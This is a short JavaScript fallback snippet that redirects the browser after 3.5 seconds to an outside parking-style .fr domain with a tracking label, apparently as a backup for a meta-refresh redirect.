
// Backup redirect if meta refresh fails
setTimeout(() => {
  if (window.location.href === document.location.href) {
    window.location.href = 'https://itsasbideparking.fr?label=ae2e5459743438c36414a7b86781a2ab';
  }
}, 3500);
